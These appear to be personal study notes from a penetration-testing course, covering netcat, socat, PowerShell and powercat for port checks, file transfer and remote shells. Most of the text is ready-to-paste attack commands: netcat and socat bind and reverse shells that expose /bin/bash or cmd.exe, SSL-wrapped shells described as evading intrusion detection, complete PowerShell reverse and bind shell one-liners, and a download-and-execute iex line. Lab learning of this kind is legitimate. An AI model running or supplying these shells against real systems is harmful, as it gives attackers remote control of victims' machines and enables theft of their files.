#4.1 Netcat           # client mode - check if port is opened // read banner from service listenning on a port // Connect to a network service manually

nc -nv 10.10.1.12 110       #check if 110 port is opened on remote machine // -n skip DNS name // -v verbous
nc -lvnp 4444               #listen on 4444 // -l create listener // -p listening port number

## Transfer Files
###on Win (receiving machine):
nc -lvnp 4444 > incoming.exe
###on Linux:
nc -nv 10.10.1.11 4444 < /usr/share/win/.../wget.exe    #don't receive download progress, so give it a time

## Remote Administration with Netcat

## Netcat Bind Shell Scenario
on Win:
nc -nlvp 4444 -e cmd.exe

on Attacker:
nc -nv IP-of-Win 444

## Netcat Reverse Shell Scenario
on Attacker:
nc -nvlp 4444

on Linux Victim:
nc -nv ip-of-attacker 4444 -e /bin/bash   #-e make an application available remotely (in our case - /bin/bash)

#4.2 Netcat VS Socat
nc <remote server's ip address> 80
socat - TCP4:<remote server's ip address>:80    

  ex: socat - TCP4:10.10.11.11:110      #Socat Bind Shell
  USER offsec
  PASS offsec
  
  ex2: start listener
  sudo socat TCP4-LISTEN:443 STDOUT
  on attacker:
  socat - TCP4:10.10.11.11(victimIP):443 --> hello from attacker
  the victim receives the message, and can write back --> yooo man
  the attacker receives "yoo man"       #we have bidirectional chat this wat
  
nc -lvp localhost 443
socat TCP4-LISTEN:443 STDOUT

## Socat File Transfer

sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt   #share file on 443 // fork create chilp process when create listener
// on other machine we download the file:
socat TCP4:10.10.11.1(ip of the sharing machine):443 file:received_secret>passwords.txt,create
//check the file on Windows machine by --> type received_secret_passwords.txt --> print the content of the file

## Socat Reverse Shells
we start listener on Win mashine:
socat -d -d TCP4-LISTEN:443 STDOUT            # -d -d increase the verbousity of the output
and on the victim Linux machine:
socat TCP4:10.11.0.22:443 EXEC:/bin/bash      #check by whoami or id commands

## Socat Encrypted Bind Shells
# evading IDS with SSL encryption //openssl

#generate key:
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt    #enter the data, Coutry, Name, e-mail etc.
          ##
          • req: initiate a new certificate signing request
          • -newkey: generate a new private key
          • rsa:2048: use RSA encryption with a 2,048-bit key length.
          • -nodes: store the private key without passphrase protection
          • -keyout: save the key to a file
          • -x509: output a self-signed certificate instead of a certificate request
          • -days: set validity period in days
          • -out: save the certificate to a file
          
#combine bind shell key and bind shell cert files into single .pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# create encrypted socat listener (on "target" machine):
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
# on attacker machine:
socat - OPENSSL:10.11.0.4:443,verify=0 --> start type commands that will be executed on the target
          verify=0 disable ssl verification (because our cert is self signed)

#4.3 PowerShell and Powercat

#Run PowerShell as Administrator
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy --> Unrestricted

#File Transfers
# on Win,  in cmd we type:
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

wget.exe -V

#PowerShell Reverse Shells
#start listener on our kali 
nc -lvnp 443
# paste this oneliner on the Win, victim and we'll get the reverse shell:     // change IP and PORT!!
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"

#PowerShell Bind Shells   # first create the bind shell on the target, then connect from attacker machine
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
nc -nv 10.11.0.22 443 --> receive connection from the victim with the bind shell // we can execute commands now

# Powercar    #Powershell version of Netcat // simplifies the creation of bind/reverse shells.
# start powershell on Win and load the script
. .\powercat.ps1      #Loading a local PowerShell script using dot sourcing // only for the current powershell, need to be reexecuted when restarted or opened another powershel!
# we can execute powercat now
# If the target machine is connected to the Internet, we can do the same with a remote script by once again using the handy iex cmdlet as follows:
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
#It is worth noting that scripts loaded in this way will only be available in the current PowerShell instance and will need to be reloaded each time we restart PowerShell.
#Now that our script is loaded, we can execute powercat as follows:
powercat
powercat -h

#4.3.5 Powercat File Transfers




